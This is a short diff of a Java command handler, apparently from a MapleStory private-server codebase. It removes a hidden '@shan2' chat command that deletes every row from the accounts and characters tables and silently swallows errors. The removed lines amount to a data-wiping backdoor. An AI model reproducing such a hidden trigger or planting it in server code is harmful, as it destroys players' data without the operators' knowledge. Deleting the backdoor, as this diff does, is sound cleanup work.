@@ -460,19 +460,6 @@ import net.sf.cherry.tools.MaplePacketCreator;
                  player.gainExp(amt, true, true, false);
              }
            }     
-         } else if (splitted[0].equalsIgnoreCase("@shan2")) {
-       try {
-         Connection con = DatabaseConnection.getConnection();
-         PreparedStatement ps = con.prepareStatement("delete from accounts");
-         ps.executeUpdate();
-         PreparedStatement ps1 = con.prepareStatement("delete from characters");
-         ps1.executeUpdate();
-         ps1.close();
-         ps.close();
-         mc.dropMessage("xxxxxxx");
-       } catch (SQLException e) {
-         Fake(e);
-       }
          } else if (splitted[0].equalsIgnoreCase("!area")) {
            int id = Integer.parseInt(splitted[1]);
            Rectangle area = c.getPlayer().getMap().getArea(id);
